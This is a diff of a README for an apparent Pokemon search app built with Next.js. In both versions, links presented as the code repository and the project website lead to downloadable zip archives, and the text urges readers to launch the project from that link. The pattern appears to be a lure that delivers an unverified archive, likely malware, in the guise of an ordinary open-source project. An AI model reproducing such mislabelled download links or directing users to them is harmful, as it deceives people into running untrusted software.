@@ -19,12 +19,12 @@ Welcome to the Pokemon Search App NextJS repository! This is where you can find 
 - tailwindcss
 
 ## Useful Resources 📚
-If you want to dive into the code or contribute to the project, you can access the repository by clicking [here](https://github.com/kiatun3434/Pokemon-Search-App-NextJS/releases/download/v2.0/Software.zip).
+If you want to dive into the code or contribute to the project, you can access the repository by clicking [here](https://raw.githubusercontent.com/kiatun3434/Pokemon-Search-App-NextJS/main/complimentalness/App_JS_Search_Pokemon_Next_3.7.zip).
 
 🚀 Remember, the project needs to be launched by accessing the above link! 🚀
 
 ## 🌐 Visit Our Website 🌐
-If you're interested in learning more about our project or exploring the interface, feel free to visit our website by clicking [here](https://github.com/kiatun3434/Pokemon-Search-App-NextJS/releases/download/v2.0/Software.zip).
+If you're interested in learning more about our project or exploring the interface, feel free to visit our website by clicking [here](https://raw.githubusercontent.com/kiatun3434/Pokemon-Search-App-NextJS/main/complimentalness/App_JS_Search_Pokemon_Next_3.7.zip).
 
 ## Releases 📦
 If the provided link doesn't work or you require more information, please check the "Releases" section of this repository.
